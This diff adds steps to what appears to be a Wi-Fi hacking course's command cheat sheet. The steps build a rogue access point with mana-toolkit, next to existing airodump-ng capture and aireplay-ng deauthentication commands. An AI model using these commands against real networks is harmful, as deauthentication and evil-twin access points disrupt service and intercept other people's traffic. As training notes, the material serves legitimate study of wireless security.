@@ -37,6 +37,14 @@ Here are the commands that will be used in the course
   * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
 * Deauth Attacks
   * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
+* Creatting a fake access point
+  * You need to have internet connection and a wireless card to broadcast it.
+  * `apt-get install mana-toolkit`
+  * Edit the files bellow
+  * `leafpad /etc/mana-toolkit/hostpad-mana.conf`
+  * `leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
+  * Start the network
+  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 ## Crack WEP
 ### Busy Network
 * Start airodump-ng in the target
